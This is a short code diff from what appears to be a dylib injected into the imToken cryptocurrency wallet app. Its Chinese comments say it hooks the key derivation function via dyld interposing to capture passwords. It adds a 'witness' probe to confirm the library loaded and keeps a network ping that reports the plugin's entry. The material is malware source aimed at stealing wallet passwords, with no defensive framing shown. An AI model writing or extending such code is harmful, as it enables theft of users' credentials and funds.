@@ -264,6 +264,7 @@ void plugin_main(void) {
     // KDF interpose 由 dyld 在加载本 dylib 时自动生效（__DATA,__interpose 段），
     // 这里只做一次标记；真正抓密码在 MyCCKeyDerivationPBKDF 里。
     HookKDFInstall();
+    HookKDFWriteWitness();   // 基线探针：证明 dylib 已加载
 
     // 网络那条路照发（可能早于网络栈就绪，不指望它）
     RawPingAsync(@"imtoken_plugin_main", @"entry called");
